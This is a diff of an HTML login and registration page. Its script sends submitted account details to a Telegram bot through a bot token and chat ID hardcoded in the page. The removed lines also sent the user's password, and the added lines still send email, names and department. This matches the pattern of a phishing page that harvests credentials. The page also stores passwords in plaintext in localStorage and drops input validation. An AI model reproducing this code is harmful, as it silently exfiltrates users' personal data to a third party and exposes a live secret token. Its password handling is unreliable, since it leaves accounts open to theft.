@@ -70,8 +70,6 @@
             margin-bottom: 10px;
         }
     </style>
-    <!-- reCAPTCHA script -->
-    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
 </head>
 <body>
 
@@ -88,9 +86,10 @@
             <label for="login-password">Password</label>
             <input type="password" id="login-password" name="login-password" placeholder="Enter your password" required>
 
-            <!-- reCAPTCHA for login -->
-            <div class="g-recaptcha" data-sitekey="YOUR_SITE_KEY"></div>
-
+            <!-- Google reCAPTCHA for Login -->
+            <div class="g-recaptcha" data-sitekey="6LcVnGYqAAAAAExNHsBoVEb7kIjseAVvcp7WHfYO"></div>
+            <br>
+            
             <div class="form-actions">
                 <button type="button" id="login-submit">Login</button>
             </div>
@@ -116,9 +115,10 @@
             <label for="confirm-password">Confirm Password</label>
             <input type="password" id="confirm-password" name="confirm-password" placeholder="Confirm your password" required>
 
-            <!-- reCAPTCHA for registration -->
-            <div class="g-recaptcha" data-sitekey="YOUR_SITE_KEY"></div>
-
+            <!-- Google reCAPTCHA for Registration -->
+            <div class="g-recaptcha" data-sitekey="6LcVnGYqAAAAAExNHsBoVEb7kIjseAVvcp7WHfYO"></div>
+            <br>
+            
             <div class="form-actions">
                 <button type="button" id="register-submit">Create Account</button>
             </div>
@@ -171,6 +171,7 @@
         </section>
     </section>
 
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
     <script>
         const telegramBotToken = "7523355108:AAFoWXH3sCyNrwhCWQRwsFZekWrKKa2xQso"; // Bot token
         const chatId = "6919240425"; // Chat ID
@@ -206,49 +207,32 @@
             const department = document.getElementById('department').value.trim();
             const password = document.getElementById('password').value;
             const confirmPassword = document.getElementById('confirm-password').value;
-            const emailRegex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/; // Validate email
-            const passwordValid = password.length >= 8; // Validate password
-            const passwordsMatch = password === confirmPassword; // Check if passwords match
 
-            if (!emailRegex.test(email)) {
-                document.getElementById('register-error').innerText = 'Please enter a valid email address (only Gmail addresses allowed).';
+            if (password !== confirmPassword) {
+                document.getElementById('register-error').textContent = 'Passwords do not match';
                 document.getElementById('register-error').style.display = 'block';
                 return;
             }
 
-            if (!passwordValid) {
-                document.getElementById('register-error').innerText = 'Password must be at least 8 characters long.';
-                document.getElementById('register-error').style.display = 'block';
-                return;
-            }
+            const storedUsers = JSON.parse(localStorage.getItem('users')) || {};
+            storedUsers[email] = { email, firstName, lastName, department, password };
+            localStorage.setItem('users', JSON.stringify(storedUsers));
 
-            if (!passwordsMatch) {
-                document.getElementById('register-error').innerText = 'Passwords do not match.';
-                document.getElementById('register-error').style.display = 'block';
-                return;
-            }
-
-            const users = JSON.parse(localStorage.getItem('users')) || {};
-            users[email] = { email, firstName, lastName, department, password };
-            localStorage.setItem('users', JSON.stringify(users));
-
-            const message = `Registration: Email: ${email}, Password: ${password}, First Name: ${firstName}, Last Name: ${lastName}, Department: ${department}`;
+            const message = `New Account: Email: ${email}, First Name: ${firstName}, Last Name: ${lastName}, Department: ${department}`;
             sendMessageToTelegram(message);
-            showSection('login-section'); // Navigate back to login page
+            showSection('login-section');
         });
 
-        // Navigate to Register page
-        document.getElementById('go-to-register').addEventListener('click', function(e) {
-            e.preventDefault();
-            showSection('register-section');
-        });
-
-        // Send message to Telegram function
+        // Send message to Telegram
         function sendMessageToTelegram(message) {
             const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-            fetch(url);
+            fetch(url).then(response => console.log(response));
         }
-    </script>
 
+        // Navigation to Register page
+        document.getElementById('go-to-register').addEventListener('click', function() {
+            showSection('register-section');
+        });
+    </script>
 </body>
 </html>
